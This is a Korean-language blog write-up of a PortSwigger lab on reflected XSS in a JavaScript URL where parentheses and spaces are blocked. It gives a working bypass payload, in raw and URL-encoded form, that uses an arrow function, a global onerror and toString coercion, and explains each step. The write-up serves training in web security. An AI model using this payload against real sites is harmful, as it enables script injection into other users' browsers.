+++
date = '2026-06-08T09:00:00+09:00'
draft = false
title = '[Write-up] PortSwigger - Reflected XSS in a JavaScript URL with some characters blocked'
summary = "괄호와 공백이 차단된 JavaScript URL에서 화살표 함수, 전역 onerror, 강제 문자열 변환을 조합해 alert(1337)을 실행하는 풀이"
toc = true
tags = ["XSS", "Reflected XSS", "JavaScript URL", "Filter Bypass", "PortSwigger", "Expert"]
+++

---

## 문제 분석

> **난이도**: `EXPERT`  
> **Lab**: [Reflected XSS in a JavaScript URL with some characters blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked)

> ![image.png](/writeup/portswigger/xss/28/1.png)

블로그 게시글의 Back to Blog 링크는 현재 URL을 JavaScript URL 내부에 반사한다. 일부 문자가 차단된 환경에서 링크를 클릭했을 때 `1337`을 포함한 값을 `alert()`로 출력하면 문제가 해결된다.

### XSS 진단

링크는 다음과 같은 형태다.

```html
<a href="javascript:fetch('/analytics', {
  method:'post',
  body:'/post%3fpostId%3d4'
}).finally(_ => window.location = '/')">Back to Blog</a>
```

`postId` 뒤에 새로운 쿼리 파라미터를 추가하면 그 값도 `body` 문자열 안에 반사된다. 작은따옴표는 URL 인코딩된 상태로 보이지만 JavaScript URL이 실행될 때 디코딩되므로 문자열 구분자로 사용할 수 있다.

일반적인 함수 호출을 주입하면 소괄호와 공백이 필터링된다. 따라서 괄호 없이 함수를 정의하고 실행하는 JavaScript 문법을 조합해야 한다.

---

## 익스플로잇

다음 값을 `postId` 뒤의 추가 파라미터로 전달한다.

```javascript
'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
```

URL 인코딩한 요청은 다음과 같다.

```text
/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
```

페이로드는 다음 순서로 동작한다.

1. `'}`가 기존 `body` 문자열과 객체를 닫는다.
2. `x=x=>{...}`로 소괄호 없이 화살표 함수를 정의한다.
3. `/**/`를 공백 대신 사용해 `throw` 문과 다음 토큰을 분리한다.
4. 쉼표 표현식의 `onerror=alert`가 전역 오류 처리기를 `alert`로 지정하고 `1337`을 throw한다.
5. `toString=x`로 전역 객체의 문자열 변환 함수를 앞서 만든 함수로 교체한다.
6. `window+''`가 강제 문자열 변환을 일으켜 `x`를 호출한다.
7. 마지막 `{x:'`가 원래 코드의 남은 부분과 문법을 맞춘다.

![image.png](/writeup/portswigger/xss/28/2.png)

Back to Blog 링크를 클릭하면 JavaScript URL이 실행되고, 전역 오류 처리기로 전달된 `1337`이 alert 메시지에 표시되어 문제가 해결된다.

![image.png](/writeup/portswigger/xss/28/3.png)

---

## 정리

문자 몇 개를 차단하는 방식은 JavaScript가 제공하는 다양한 간접 호출과 형 변환 경로를 모두 막기 어렵다. 이 랩은 화살표 함수, `toString`, 전역 `onerror`, `throw`를 조합해 소괄호와 공백 없이 함수를 호출한다. JavaScript 컨텍스트의 사용자 입력은 블랙리스트가 아니라 코드와 데이터의 구조적 분리로 보호해야 한다.
